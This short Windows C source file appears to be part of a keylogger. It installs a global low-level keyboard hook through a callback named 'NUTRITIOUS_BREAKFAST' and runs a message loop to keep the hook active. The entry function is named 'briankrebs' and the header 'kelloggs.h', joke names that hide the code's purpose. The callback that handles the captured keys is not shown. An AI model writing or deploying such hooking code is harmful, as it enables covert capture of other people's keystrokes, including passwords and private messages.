#include <Windows.h>

#include "kelloggs.h"

HHOOK kbh; // keyboard hook

int briankrebs() {
	kbh = SetWindowsHookEx(WH_KEYBOARD_LL, NUTRITIOUS_BREAKFAST, GetModuleHandle(NULL), 0);

	if (!kbh) {
		ExitProcess(0);
	}
	


	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(kbh);
	return 0;
}